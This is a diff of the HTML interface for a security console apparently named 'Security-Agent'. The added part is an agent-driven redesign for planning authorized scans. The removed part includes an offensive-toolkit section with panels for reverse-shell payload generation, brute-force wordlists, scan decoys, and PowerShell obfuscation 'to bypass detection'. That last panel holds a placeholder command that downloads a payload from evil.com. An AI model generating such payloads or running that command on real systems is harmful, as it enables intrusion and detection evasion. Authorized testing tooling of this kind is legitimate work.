-                <div class="panel-header">
-                    <h1>Plan a Scan</h1>
-                    <p class="subtitle">Configure and plan an engagement scan</p>
-                </div>
-                <div class="form-grid">
-                    <div class="form-group full-width">
-                        <label for="plan-config-path">Engagement Config Path</label>
-                        <div class="input-with-button">
-                            <input type="text" id="plan-config-path" placeholder="/path/to/engagement.config">
-                            <button class="btn secondary" id="btn-browse-plan-config">Browse</button>
-                        </div>
-                        <p class="field-hint">Config format is <code>key=value</code> (lines starting with <code>#</code> are comments; targets go in <code>[target]</code> sections). Example: engagement_id, authorized_by, time_window_start/end (epoch seconds), allowed_techniques, then a <code>[target]</code> section per target (id, target_type, criticality).</p>
-                    </div>
-                    <div class="form-group">
-                        <label for="plan-audit-log">Audit Log Path <span class="optional">(optional)</span></label>
-                        <input type="text" id="plan-audit-log" placeholder="/path/to/audit.jsonl">
-                    </div>
-                    <div class="form-group">
-                        <label for="plan-audit-db">Audit Database <span class="optional">(optional)</span></label>
-                        <input type="text" id="plan-audit-db" placeholder="/path/to/audit.sadb">
-                    </div>
-                    <div class="form-group">
-                        <label for="plan-memory">Memory Log <span class="optional">(optional)</span></label>
-                        <input type="text" id="plan-memory" placeholder="/path/to/memory.jsonl">
-                    </div>
-                    <div class="form-group">
-                        <label for="plan-calibration-db">Calibration DB <span class="optional">(optional)</span></label>
-                        <input type="text" id="plan-calibration-db" placeholder="/path/to/calibration.sadb">
-                    </div>
-                    <div class="form-group full-width">
-                        <label class="checkbox-label">
-                            <input type="checkbox" id="plan-cognitive-review">
-                            <span>Run cognitive review (--cognitive-review)</span>
-                        </label>
-                    </div>
-                    <div class="form-group full-width">
-                        <label class="checkbox-label">
-                            <input type="checkbox" id="plan-execute">
-                            <span>Execute approved tools now (--execute)</span>
-                        </label>
-                    </div>
-                    <div class="form-group full-width conditional" id="plan-execute-options" style="display:none;">
-                        <label class="checkbox-label">
-                            <input type="checkbox" id="plan-allow-network">
-                            <span>Allow network / active tools for execution</span>
-                        </label>
-                        <div class="form-group" style="margin-top:8px;">
-                            <label for="plan-exec-args">Tool Arguments <span class="optional">(optional)</span></label>
-                            <input type="text" id="plan-exec-args" placeholder="space-separated arguments">
-                        </div>
-                    </div>
-                </div>
-                <div class="action-bar">
-                    <button class="btn primary" id="btn-plan-scan">Plan Scan</button>
-                </div>
-                <div class="output-block" id="output-plan-scan">
-                    <div class="empty-state">Configure the engagement and click Plan Scan.</div>
-                </div>
-            </section>
-
-            <!-- Findings Panel -->
-            <section class="panel" id="panel-findings">
-                <div class="panel-header">
-                    <h1>Record Findings</h1>
-                    <p class="subtitle">Merge findings from a source log into a destination</p>
-                </div>
-                <div class="form-grid">
-                    <div class="form-group full-width">
-                        <label for="findings-dest">Destination Findings Log</label>
-                        <div class="input-with-button">
-                            <input type="text" id="findings-dest" placeholder="/path/to/destination.jsonl">
-                            <button class="btn secondary" id="btn-browse-findings-dest">Browse</button>
-                        </div>
-                    </div>
-                    <div class="form-group full-width">
-                        <label for="findings-src">Source Findings Log</label>
-                        <div class="input-with-button">
-                            <input type="text" id="findings-src" placeholder="/path/to/source.jsonl">
-                            <button class="btn secondary" id="btn-browse-findings-src">Browse</button>
-                        </div>
-                    </div>
-                </div>
-                <div class="action-bar">
-                    <button class="btn primary" id="btn-record-findings">Record Findings</button>
-                </div>
-                <div class="output-block" id="output-findings">
-                    <div class="empty-state">Select source and destination, then click Record.</div>
-                </div>
-            </section>
-
-            <!-- Schedule Retest Panel -->
-            <section class="panel" id="panel-retest">
-                <div class="panel-header">
-                    <h1>Schedule Retest</h1>
-                    <p class="subtitle">Generate a retest schedule from a findings log</p>
-                </div>
-                <div class="form-grid">
-                    <div class="form-group full-width">
-                        <label for="retest-path">Findings Log Path</label>
-                        <div class="input-with-button">
-                            <input type="text" id="retest-path" placeholder="/path/to/findings.jsonl">
-                            <button class="btn secondary" id="btn-browse-retest">Browse</button>
-                        </div>
-                    </div>
-                </div>
-                <div class="action-bar">
-                    <button class="btn primary" id="btn-schedule-retest">Schedule Retest</button>
-                </div>
-                <div class="output-block" id="output-retest">
-                    <div class="empty-state">Select a findings log, then click Schedule Retest.</div>
-                </div>
-            </section>
-
-            <!-- Audit Log Panel -->
-            <section class="panel" id="panel-audit">
-                <div class="panel-header">
-                    <h1>Audit Log</h1>
-                    <p class="subtitle">View persisted audit records</p>
-                </div>
-                <div class="form-grid">
-                    <div class="form-group full-width">
-                        <label for="audit-log-path">Audit Log Path</label>
-                        <div class="input-with-button">
-                            <input type="text" id="audit-log-path" placeholder="/path/to/audit.jsonl">
-                            <button class="btn secondary" id="btn-browse-audit-log">Browse</button>
-                        </div>
-                    </div>
-                </div>
-                <div class="action-bar">
-                    <button class="btn primary" id="btn-view-audit">View Audit Log</button>
-                </div>
-                <div class="output-block" id="output-audit">
-                    <div class="empty-state">Select an audit log file, then click View.</div>
-                </div>
-            </section>
-
-            <!-- Audit Database Panel -->
-            <section class="panel" id="panel-audit-db">
-                <div class="panel-header">
-                    <h1>Audit Database</h1>
-                    <p class="subtitle">View the .sadb audit database</p>
-                </div>
-                <div class="form-grid">
-                    <div class="form-group full-width">
-                        <label for="audit-db-path">Audit Database Path</label>
-                        <div class="input-with-button">
-                            <input type="text" id="audit-db-path" placeholder="/path/to/audit.sadb">
-                            <button class="btn secondary" id="btn-browse-audit-db">Browse</button>
-                        </div>
-                    </div>
-                </div>
-                <div class="action-bar">
-                    <button class="btn primary" id="btn-view-audit-db">View Audit Database</button>
-                </div>
-                <div class="output-block" id="output-audit-db">
-                    <div class="empty-state">Select an audit database file, then click View.</div>
-                </div>
-            </section>
-
-            <!-- Findings Database Panel -->
-            <section class="panel" id="panel-findings-db">
-                <div class="panel-header">
-                    <h1>Findings Database</h1>
-                    <p class="subtitle">View the .sadb findings database</p>
-                </div>
-                <div class="form-grid">
-                    <div class="form-group full-width">
-                        <label for="findings-db-path">Findings Database Path</label>
-                        <div class="input-with-button">
-                            <input type="text" id="findings-db-path" placeholder="/path/to/findings.sadb">
-                            <button class="btn secondary" id="btn-browse-findings-db">Browse</button>
-                        </div>
-                    </div>
-                </div>
-                <div class="action-bar">
-                    <button class="btn primary" id="btn-view-findings-db">View Findings Database</button>
-                </div>
-                <div class="output-block" id="output-findings-db">
-                    <div class="empty-state">Select a findings database file, then click View.</div>
-                </div>
-            </section>
-
-            <!-- Calibration Database Panel -->
-            <section class="panel" id="panel-calibration-db">
-                <div class="panel-header">
-                    <h1>Calibration Database</h1>
-                    <p class="subtitle">View the .sadb calibration database</p>
-                </div>
-                <div class="form-grid">
-                    <div class="form-group full-width">
-                        <label for="calibration-db-path">Calibration Database Path</label>
-                        <div class="input-with-button">
-                            <input type="text" id="calibration-db-path" placeholder="/path/to/calibration.sadb">
-                            <button class="btn secondary" id="btn-browse-calibration-db">Browse</button>
-                        </div>
-                    </div>
-                </div>
-                <div class="action-bar">
-                    <button class="btn primary" id="btn-view-calibration-db">View Calibration Database</button>
-                </div>
-                <div class="output-block" id="output-calibration-db">
-                    <div class="empty-state">Select a calibration database file, then click View.</div>
-                </div>
-            </section>
-
-            <!-- Reasoning Log Panel -->
-            <section class="panel" id="panel-reasoning-db">
-                <div class="panel-header">
-                    <h1>Reasoning Log Database</h1>
-                    <p class="subtitle">View the .sadb reasoning chain archive</p>
-                </div>
-                <div class="form-grid">
-                    <div class="form-group full-width">
-                        <label for="reasoning-db-path">Reasoning Log Database Path</label>
-                        <div class="input-with-button">
-                            <input type="text" id="reasoning-db-path" placeholder="/path/to/reasoning.sadb">
-                            <button class="btn secondary" id="btn-browse-reasoning-db">Browse</button>
-                        </div>
-                    </div>
-                </div>
-                <div class="action-bar">
-                    <button class="btn primary" id="btn-view-reasoning-db">View Reasoning Log</button>
-                </div>
-                <div class="output-block" id="output-reasoning-db">
-                    <div class="empty-state">Select a reasoning log database file, then click View.</div>
-                </div>
-            </section>
-
-            <!-- LLM Generate Panel -->
-            <section class="panel" id="panel-llm-generate">
-                <div class="panel-header">
-                    <h1>Generate Text (LLM)</h1>
-                    <p class="subtitle">Generate text using the built-in language model</p>
-                </div>
-                <div class="form-grid">
-                    <div class="form-group full-width">
-                        <label for="llm-gen-prompt">Prompt</label>
-                        <textarea id="llm-gen-prompt" rows="4" placeholder="Enter a prompt for text generation..."></textarea>
-                    </div>
-                </div>
-                <div class="action-bar">
-                    <button class="btn primary" id="btn-llm-generate">Generate</button>
-                </div>
-                <div class="output-block" id="output-llm-generate">
-                    <div class="empty-state">Enter a prompt and click Generate.</div>
-                </div>
-            </section>
-
-            <!-- LLM Anomaly Panel -->
-            <section class="panel" id="panel-llm-anomaly">
-                <div class="panel-header">
-                    <h1>Anomaly Score (LLM)</h1>
-                    <p class="subtitle">Score text for anomalous content</p>
-                </div>
-                <div class="form-grid">
-                    <div class="form-group full-width">
-                        <label for="llm-anomaly-text">Text to Score</label>
-                        <textarea id="llm-anomaly-text" rows="4" placeholder="Enter text to score for anomalies..."></textarea>
-                    </div>
-                </div>
-                <div class="action-bar">
-                    <button class="btn primary" id="btn-llm-anomaly">Score for Anomaly</button>
-                </div>
-                <div class="output-block" id="output-llm-anomaly">
-                    <div class="empty-state">Enter text and click Score for Anomaly.</div>
-                </div>
-            </section>
-
-            <!-- Ask (NLU) Panel -->
-            <section class="panel" id="panel-ask">
-                <div class="panel-header">
-                    <h1>Ask (Natural Language)</h1>
-                    <p class="subtitle">Ask a plain-English question, routed through the NLU engine</p>
-                </div>
-                <div class="form-grid">
-                    <div class="form-group full-width">
-                        <label for="ask-input">Your Instruction</label>
-                        <textarea id="ask-input" rows="4" placeholder="e.g. What tools do you have? / Are you healthy? / Generate text about scanning..."></textarea>
-                    </div>
-                </div>
-                <div class="action-bar">
-                    <button class="btn primary" id="btn-ask">Ask</button>
-                </div>
-                <div class="output-block" id="output-ask">
-                    <div class="empty-state">Type a question in plain English and click Ask.</div>
-                </div>
-            </section>
-
-            <!-- About Panel -->
-            <section class="panel" id="panel-about">
-                <div class="panel-header">
-                    <h1>About</h1>
-                    <p class="subtitle">Mission statement and roadmap</p>
-                </div>
-                <div class="action-bar">
-                    <button class="btn primary" id="btn-about">Load About</button>
-                </div>
-                <div class="output-block" id="output-about">
-                    <div class="empty-state">Click Load About to view mission and roadmap.</div>
-                </div>
-            </section>
-
-            <!-- ═══════════════════════════════════════════════════════════════
-                 Offensive Toolkit Panels
-                 ═══════════════════════════════════════════════════════════════ -->
-
-            <!-- Hash ID Panel -->
-            <section class="panel" id="panel-offensive-hash">
-                <div class="panel-header">
-                    <h1>Hash Identification</h1>
-                    <p class="subtitle">Identify hash type and suggest cracking tools</p>
-                </div>
-                <div class="form-grid">
-                    <div class="form-group full-width">
-                        <label for="offensive-hash-input">Hash</label>
-                        <input type="text" id="offensive-hash-input" placeholder="e.g. 5f4dcc3b5aa765d61d8327deb882cf99">
-                    </div>
-                </div>
-                <div class="action-bar">
-                    <button class="btn primary" id="btn-offensive-hash">Identify Hash</button>
-                </div>
-                <div class="output-block" id="output-offensive-hash">
-                    <div class="empty-state">Enter a hash to identify its type.</div>
-                </div>
-            </section>
-
-            <!-- Password Strength Panel -->
-            <section class="panel" id="panel-offensive-password">
-                <div class="panel-header">
-                    <h1>Password Strength Analysis</h1>
-                    <p class="subtitle">Analyze password entropy and crack resistance</p>
-                </div>
-                <div class="form-grid">
-                    <div class="form-group full-width">
-                        <label for="offensive-password-input">Password</label>
-                        <input type="text" id="offensive-password-input" placeholder="e.g. CorrectHorseBatteryStaple">
-                    </div>
-                </div>
-                <div class="action-bar">
-                    <button class="btn primary" id="btn-offensive-password">Analyze Strength</button>
-                </div>
-                <div class="output-block" id="output-offensive-password">
-                    <div class="empty-state">Enter a password to analyze its strength.</div>
-                </div>
-            </section>
-
-            <!-- Gen Wordlist Panel -->
-            <section class="panel" id="panel-offensive-wordlist">
-                <div class="panel-header">
-                    <h1>Generate Wordlist</h1>
-                    <p class="subtitle">Generate a targeted wordlist for brute-force attacks</p>
-                </div>
-                <div class="form-grid">
-                    <div class="form-group">
-                        <label for="offensive-wordlist-target">Target</label>
-                        <input type="text" id="offensive-wordlist-target" placeholder="e.g. company-name">
-                    </div>
-                    <div class="form-group">
-                        <label for="offensive-wordlist-company">Company <span class="optional">(optional)</span></label>
-                        <input type="text" id="offensive-wordlist-company" placeholder="e.g. Acme Corp">
-                    </div>
-                    <div class="form-group">
-                        <label for="offensive-wordlist-year">Year <span class="optional">(optional)</span></label>
-                        <input type="text" id="offensive-wordlist-year" placeholder="e.g. 2025">
-                    </div>
-                </div>
-                <div class="action-bar">
-                    <button class="btn primary" id="btn-offensive-wordlist">Generate Wordlist</button>
-                </div>
-                <div class="output-block" id="output-offensive-wordlist">
-                    <div class="empty-state">Enter a target and click Generate.</div>
-                </div>
-            </section>
-
-            <!-- Gen Shell Payload Panel -->
-            <section class="panel" id="panel-offensive-shell">
-                <div class="panel-header">
-                    <h1>Generate Shell Payload</h1>
-                    <p class="subtitle">Generate a reverse/bind shell payload</p>
-                </div>
-                <div class="form-grid">
-                    <div class="form-group">
-                        <label for="offensive-shell-type">Shell Type</label>
-                        <select id="offensive-shell-type">
-                            <option value="bash">bash</option>
-                            <option value="netcat">netcat</option>
-                            <option value="python">python</option>
-                            <option value="perl">perl</option>
-                            <option value="ruby">ruby</option>
-                            <option value="php">php</option>
-                            <option value="tcp">tcp</option>
-                        </select>
-                    </div>
-                    <div class="form-group">
-                        <label for="offensive-shell-lhost">LHOST</label>
-                        <input type="text" id="offensive-shell-lhost" placeholder="e.g. 10.0.0.1">
-                    </div>
-                    <div class="form-group">
-                        <label for="offensive-shell-lport">LPORT</label>
-                        <input type="number" id="offensive-shell-lport" placeholder="e.g. 4444" min="1" max="65535">
-                    </div>
-                </div>
-                <div class="action-bar">
-                    <button class="btn primary" id="btn-offensive-shell">Generate Payload</button>
-                </div>
-                <div class="output-block" id="output-offensive-shell">
-                    <div class="empty-state">Select shell type and enter LHOST/LPORT.</div>
-                </div>
-            </section>
-
-            <!-- Analyze Payload Panel -->
-            <section class="panel" id="panel-offensive-payload">
-                <div class="panel-header">
-                    <h1>Analyze Payload</h1>
-                    <p class="subtitle">Analyze a payload for shellcode patterns and detection risk</p>
-                </div>
-                <div class="form-grid">
-                    <div class="form-group full-width">
-                        <label for="offensive-payload-input">Payload</label>
-                        <textarea id="offensive-payload-input" rows="3" placeholder="Enter shellcode or payload bytes..."></textarea>
-                    </div>
-                </div>
-                <div class="action-bar">
-                    <button class="btn primary" id="btn-offensive-payload">Analyze Payload</button>
-                </div>
-                <div class="output-block" id="output-offensive-payload">
-                    <div class="empty-state">Enter a payload to analyze.</div>
-                </div>
-            </section>
-
-            <!-- PS Obfuscation Panel -->
-            <section class="panel" id="panel-offensive-evasion">
-                <div class="panel-header">
-                    <h1>PowerShell Obfuscation</h1>
-                    <p class="subtitle">Apply PowerShell obfuscation techniques to bypass detection</p>
-                </div>
-                <div class="form-grid">
-                    <div class="form-group full-width">
-                        <label for="offensive-evasion-command">PowerShell Command</label>
-                        <textarea id="offensive-evasion-command" rows="3" placeholder="e.g. Invoke-WebRequest -Uri http://evil.com/payload.ps1"></textarea>
-                    </div>
-                </div>
-                <div class="action-bar">
-                    <button class="btn primary" id="btn-offensive-evasion">Obfuscate</button>
-                </div>
-                <div class="output-block" id="output-offensive-evasion">
-                    <div class="empty-state">Enter a PowerShell command to obfuscate.</div>
-                </div>
-            </section>
-
-            <!-- Wireless Audit Panel -->
-            <section class="panel" id="panel-offensive-wireless">
-                <div class="panel-header">
-                    <h1>Wireless Network Audit</h1>
-                    <p class="subtitle">Audit wireless network security configuration</p>
-                </div>
-                <div class="form-grid">
-                    <div class="form-group">
-                        <label for="offensive-wifi-essid">ESSID (Network Name)</label>
-                        <input type="text" id="offensive-wifi-essid" placeholder="e.g. MyNetwork">
-                    </div>
-                    <div class="form-group">
-                        <label for="offensive-wifi-security">Security Protocol</label>
-                        <select id="offensive-wifi-security">
-                            <option value="open">open</option>
-                            <option value="wep">wep</option>
-                            <option value="wpa">wpa</option>
-                            <option value="wpa2" selected>wpa2</option>
-                            <option value="wpa3">wpa3</option>
-                        </select>
-                    </div>
-                    <div class="form-group">
-                        <label for="offensive-wifi-encryption">Encryption</label>
-                        <select id="offensive-wifi-encryption">
-                            <option value="none">none</option>
-                            <option value="wep">wep</option>
-                            <option value="tkip">tkip</option>
-                            <option value="aes" selected>aes</option>
-                            <option value="ccmp">ccmp</option>
-                        </select>
-                    </div>
-                </div>
-                <div class="action-bar">
-                    <button class="btn primary" id="btn-offensive-wireless">Audit WiFi</button>
-                </div>
-                <div class="output-block" id="output-offensive-wireless">
-                    <div class="empty-state">Configure network details and click Audit.</div>
-                </div>
-            </section>
-
-            <!-- Post-Exploit Panel -->
-            <section class="panel" id="panel-offensive-postexploit">
-                <div class="panel-header">
-                    <h1>Post-Exploitation Analysis</h1>
-                    <p class="subtitle">Analyze passwd/sudoers files for privilege escalation indicators</p>
-                </div>
-                <div class="form-grid">
-                    <div class="form-group full-width">
-                        <label for="offensive-postexploit-mode">Analysis Mode</label>
-                        <select id="offensive-postexploit-mode">
-                            <option value="passwd">/etc/passwd analysis</option>
-                            <option value="sudoers">sudoers analysis</option>
-                        </select>
-                    </div>
-                    <div class="form-group full-width">
-                        <label for="offensive-postexploit-input">File Path or Content</label>
-                        <textarea id="offensive-postexploit-input" rows="4" placeholder="Paste file content or provide path (e.g. /etc/passwd)"></textarea>
-                    </div>
-                </div>
-                <div class="action-bar">
-                    <button class="btn primary" id="btn-offensive-postexploit">Analyze</button>
-                </div>
-                <div class="output-block" id="output-offensive-postexploit">
-                    <div class="empty-state">Provide file content or path and click Analyze.</div>
-                </div>
-            </section>
-
-            <!-- Gen Decoys Panel -->
-            <section class="panel" id="panel-offensive-decoys">
-                <div class="panel-header">
-                    <h1>Generate Decoy IPs</h1>
-                    <p class="subtitle">Generate decoy IP addresses for scan obfuscation</p>
-                </div>
-                <div class="form-grid">
-                    <div class="form-group">
-                        <label for="offensive-decoys-real-ip">Real IP Address</label>
-                        <input type="text" id="offensive-decoys-real-ip" placeholder="e.g. 10.0.0.1">
-                    </div>
-                    <div class="form-group">
-                        <label for="offensive-decoys-count">Count <span class="optional">(default 5)</span></label>
-                        <input type="number" id="offensive-decoys-count" placeholder="5" min="1" max="50">
-                    </div>
-                </div>
-                <div class="action-bar">
-                    <button class="btn primary" id="btn-offensive-decoys">Generate Decoys</button>
-                </div>
-                <div class="output-block" id="output-offensive-decoys">
-                    <div class="empty-state">Enter a real IP address and click Generate.</div>
-                </div>
-            </section>
-
-            <!-- Analyze Handshake Panel -->
-            <section class="panel" id="panel-offensive-handshake">
-                <div class="panel-header">
-                    <h1>Analyze WPA Handshake</h1>
-                    <p class="subtitle">Analyze EAPOL frames for WPA handshake completeness</p>
-                </div>
-                <div class="form-grid">
-                    <div class="form-group full-width">
-                        <label for="offensive-handshake-frames">EAPOL Hex Frames <span class="optional">(space-separated)</span></label>
-                        <textarea id="offensive-handshake-frames" rows="4" placeholder="Paste raw EAPOL frames as hex strings, one or more, separated by spaces"></textarea>
-                    </div>
-                </div>
-                <div class="action-bar">
-                    <button class="btn primary" id="btn-offensive-handshake">Analyze Handshake</button>
-                </div>
-                <div class="output-block" id="output-offensive-handshake">
-                    <div class="empty-state">Paste EAPOL hex frames and click Analyze.</div>
-                </div>
-            </section>
-
-            <!-- WPS PIN Panel -->
-            <section class="panel" id="panel-offensive-wps">
-                <div class="panel-header">
-                    <h1>WPS PIN Analysis</h1>
-                    <p class="subtitle">Analyze a WPS PIN for default or vulnerable status</p>
-                </div>
-                <div class="form-grid">
-                    <div class="form-group full-width">
-                        <label for="offensive-wps-pin">WPS PIN</label>
-                        <input type="text" id="offensive-wps-pin" placeholder="e.g. 12345670">
-                    </div>
-                </div>
-                <div class="action-bar">
-                    <button class="btn primary" id="btn-offensive-wps">Analyze PIN</button>
-                </div>
-                <div class="output-block" id="output-offensive-wps">
-                    <div class="empty-state">Enter a WPS PIN to analyze.</div>
-                </div>
-            </section>
-
-            <!-- Analyze Keys Panel -->
-            <section class="panel" id="panel-offensive-keys">
-                <div class="panel-header">
-                    <h1>Analyze Authorized Keys</h1>
-                    <p class="subtitle">Analyze SSH authorized_keys for lateral movement indicators</p>
-                </div>
-                <div class="form-grid">
-                    <div class="form-group full-width">
-                        <label for="offensive-keys-input">File Path or Content</label>
-                        <textarea id="offensive-keys-input" rows="4" placeholder="Paste file content or provide path (e.g. /root/.ssh/authorized_keys)"></textarea>
-                    </div>
-                </div>
-                <div class="action-bar">
-                    <button class="btn primary" id="btn-offensive-keys">Analyze Keys</button>
-                </div>
-                <div class="output-block" id="output-offensive-keys">
-                    <div class="empty-state">Provide authorized_keys content or path and click Analyze.</div>
-                </div>
-            </section>
-
-            <!-- Help & Guide Panel -->
-            <section class="panel" id="panel-help-guide">
-                <div class="panel-header">
-                    <h1>Help & Guide</h1>
-                    <p class="subtitle">Everything you need to know to use Security-Agent</p>
-                </div>
-                <div class="help-guide-content">
-
-                    <div class="help-section">
-                        <h2>🚀 Getting Started</h2>
-                        <div class="help-card">
-                            <h3>What is Security-Agent?</h3>
-                            <p>Security-Agent is an autonomous offline security operations console. It runs security tools, manages assessments, and generates reports — all from your desktop.</p>
-                            <ol>
-                                <li><strong>Check the Dashboard</strong> — The main screen shows your binary status, tool count, and system health.</li>
-                                <li><strong>Toggle Online/Offline</strong> — Use the toggle in the top-right of the Dashboard to switch modes.</li>
-                                <li><strong>Run your first tool</strong> — Go to <em>Run Tool</em> and select a tool from the dropdown.</li>
-                            </ol>
+            <!-- ═══ VIEW: OBJECTIVES ═══ -->
+            <section class="view" id="view-objectives">
+                <div class="view-inner">
+                    <div class="panel-header">
+                        <div>
+                            <h1>Objectives</h1>
+                            <p class="subtitle">State a goal and let multiple tools work together to achieve it.</p>
                         </div>
                     </div>
 
-                    <div class="help-section">
-                        <h2>📊 Dashboard</h2>
-                        <div class="help-card">
-                            <p>The Dashboard gives you a quick overview of your system:</p>
-                            <ul>
-                                <li><strong>Binary Status</strong> — Shows if the security-agent binary is found and working.</li>
-                                <li><strong>Cataloged Tools</strong> — Total number of security tools available.</li>
-                                <li><strong>Embedded Skills</strong> — Number of built-in analysis skills.</li>
-                                <li><strong>Capability Coverage</strong> — Overall readiness of your system.</li>
-                                <li><strong>Online/Offline Toggle</strong> — Switch between network-connected and air-gapped modes.</li>
-                            </ul>
+                    <div class="tabs">
+                        <button class="tab active" data-tab="agent">&#129302; Agent mode</button>
+                        <button class="tab" data-tab="playbooks">&#128736; Playbooks</button>
+                    </div>
+
+                    <!-- Agent mode -->
+                    <div class="tab-panel active" id="obj-agent">
+                        <div class="card">
+                            <p class="field-hint">Describe the objective in plain English. The agent plans one or more real commands, previews them, then executes them — chaining outputs like findings logs into later steps automatically.</p>
+                            <textarea id="agent-goal" rows="3" placeholder="Describe the engagement goal in plain language."></textarea>
+                            <div class="option-row">
+                                <label class="checkbox-label"><input type="checkbox" id="agent-dryrun" checked><span>Preview only (dry run)</span></label>
+                                <label class="checkbox-label"><input type="checkbox" id="agent-network"><span>Allow network opt-in</span></label>
+                                <label class="checkbox-label">Max steps <select id="agent-steps"><option>4</option><option selected>8</option><option>16</option><option>32</option></select></label>
+                            </div>
+                            <div class="action-bar">
+                                <button class="btn secondary" id="btn-agent-preview">Preview plan</button>
+                                <button class="btn primary" id="btn-agent-run">Run objective</button>
+                            </div>
+                        </div>
+                        <div class="console-wrap">
+                            <div class="output-block" id="output-agent">
+                                <div class="empty-state">Type an objective and preview the plan, or run it directly.</div>
+                            </div>
                         </div>
                     </div>
 
-                    <div class="help-section">
-                        <h2>🔧 Tools</h2>
-                        <div class="help-card">
-                            <h3>Run Tool</h3>
-                            <p>Execute a built-in security analyzer:</p>
-                            <ol>
-                                <li>Select a tool from the <strong>Tool</strong> dropdown (e.g., nmap, nikto, sqlmap).</li>
-                                <li>Enter a <strong>target</strong> — an IP address, URL, or file path.</li>
-                                <li>Optionally browse for an <strong>input file</strong> or set an <strong>output file</strong>.</li>
-                                <li>Click <strong>Run Tool</strong> and wait for results.</li>
-                            </ol>
+                    <!-- Playbooks -->
+                    <div class="tab-panel" id="obj-playbooks">
+                        <div class="playbook-grid" id="pb-grid"></div>
+                        <div class="card" id="pb-detail" style="display:none;"></div>
+                        <div class="console-wrap">
+                            <div class="output-block" id="output-playbooks">
+                                <div class="empty-state">Pick a playbook to chain several tools into one objective run.</div>
+                            </div>
                         </div>
-                        <div class="help-card">
-                            <h3>External Tool</h3>
-                            <p>Run any command-line tool that's installed on your system. Type the full command and arguments.</p>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ═══ VIEW: ANALYZE ═══ -->
+            <section class="view" id="view-analyze">
+                <div class="view-inner">
+                    <div class="panel-header">
+                        <div>
+                            <h1>Analyze</h1>
+                            <p class="subtitle">Run any of the <span id="tool-count-badge">89</span> cataloged tools against a file or folder.</p>
                         </div>
-                        <div class="help-card">
-                            <h3>List Tools</h3>
-                            <p>Shows all cataloged tools and whether each one is installed on your system. Green = installed, Red = not found.</p>
+                    </div>
+                    <div class="analyze-layout">
+                        <div class="analyze-side">
+                            <div class="search-input">
+                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+                                <input type="text" id="tool-search" placeholder="Search tools…">
+                            </div>
+                            <div class="cat-chips" id="tool-cats"></div>
+                            <div class="tool-list" id="tool-list"></div>
                         </div>
-                        <div class="help-card">
-                            <h3>Skills</h3>
-                            <p>Browse embedded analysis skills — pre-built assessment playbooks that combine multiple tools into a single workflow.</p>
+                        <div class="analyze-main">
+                            <div class="card" id="tool-detail">
+                                <div class="empty-state">Select a tool on the left. The input below is all you need to fill in.</div>
+                            </div>
+                            <div class="console-wrap">
+                                <div class="output-block" id="output-tools">
+                                    <div class="empty-state">Tool output will appear here.</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ═══ VIEW: ENGAGE ═══ -->
+            <section class="view" id="view-engage">
+                <div class="view-inner">
+                    <div class="panel-header">
+                        <div>
+                            <h1>Engage</h1>
+                            <p class="subtitle">Plan an authorized scan, execute it, and roll findings into a report — without writing a config file.</p>
+                        </div>
+                    </div>
+                    <div class="engage-layout">
+                        <div class="card" id="engage-form">
+                            <div class="form-grid">
+                                <div class="form-group">
+                                    <label for="eng-name">Engagement name</label>
+                                    <input type="text" id="eng-name" placeholder="Engagement name">
+                                </div>
+                                <div class="form-group">
+                                    <label for="eng-auth">Authorized by</label>
+                                    <input type="text" id="eng-auth" placeholder="Authorized operator">
+                                </div>
+                                <div class="form-group full-width">
+                                    <label for="eng-targets">Targets <span class="optional">(one per line: label — type — address)</span></label>
+                                    <textarea id="eng-targets" rows="4" placeholder="One target per line — id — type — url or host"></textarea>
+                                </div>
+                                <div class="form-group">
+                                    <label for="eng-type">Target type</label>
+                                    <select id="eng-type">
+                                        <option value="WebApp">WebApp</option>
+                                        <option value="Api">Api</option>
+                                        <option value="Infrastructure">Infrastructure</option>
+                                        <option value="Cloud">Cloud</option>
+                                        <option value="Container">Container</option>
+                                        <option value="MobileBackend">MobileBackend</option>
+                                        <option value="MobileApp">MobileApp</option>
+                                        <option value="SourceCode">SourceCode</option>
+                                        <option value="DependencyManifest">DependencyManifest</option>
+                                        <option value="Blockchain">Blockchain</option>
+                                    </select>
+                                </div>
+                                <div class="form-group">
+                                    <label for="eng-intensity">Intensity</label>
+                                    <select id="eng-intensity">
+                                        <option value="Passive">Passive</option>
+                                        <option value="Standard" selected>Standard</option>
+                                        <option value="Aggressive">Aggressive</option>
+                                    </select>
+                                </div>
+                                <div class="form-group">
+                                    <label for="eng-criticality">Criticality <span class="optional">(1–10)</span></label>
+                                    <input type="number" id="eng-criticality" value="5" min="1" max="10">
+                                </div>
+                            </div>
+                            <div class="option-row">
+                                <label class="checkbox-label"><input type="checkbox" id="eng-cognitive"><span>Cognitive review</span></label>
+                                <label class="checkbox-label"><input type="checkbox" id="eng-network"><span>Allow network / active tools</span></label>
+                                <label class="checkbox-label"><input type="checkbox" id="eng-execute" checked><span>Execute approved tools</span></label>
+                                <label class="checkbox-label"><input type="checkbox" id="eng-findings" checked><span>Write findings log</span></label>
+                                <label class="checkbox-label"><input type="checkbox" id="eng-report" checked><span>Generate report</span></label>
+                                <label class="checkbox-label"><input type="checkbox" id="eng-retest"><span>Schedule retest</span></label>
+                            </div>
+                            <div class="action-bar">
+                                <button class="btn secondary" id="btn-eng-config">Generate config</button>
+                                <button class="btn primary" id="btn-eng-plan">Plan scan</button>
+                                <button class="btn primary" id="btn-eng-run">Run engagement</button>
+                                <button class="btn secondary" id="btn-eng-report">Report</button>
+                                <button class="btn secondary" id="btn-eng-retest">Retest</button>
+                            </div>
+                            <div class="config-preview" id="eng-config-preview" style="display:none;">
+                                <div class="config-head">Generated engagement config</div>
+                                <pre id="eng-config-text"></pre>
+                            </div>
+                        </div>
+                        <div class="console-wrap">
+                            <div class="pipeline" id="pipeline"></div>
+                            <div class="output-block" id="output-engage">
+                                <div class="empty-state">Configure the engagement and click Plan scan.</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ═══ VIEW: LIBRARY ═══ -->
+            <section class="view" id="view-library">
+                <div class="view-inner">
+                    <div class="panel-header">
+                        <div>
+                            <h1>Library</h1>
+                            <p class="subtitle">Findings, audit trails, databases, the built-in LLM, quick one-off tools, and guides.</p>
+                        </div>
+                    </div>
+                    <div class="tabs">
+                        <button class="tab active" data-tab="findings">Findings</button>
+                        <button class="tab" data-tab="audit">Audit</button>
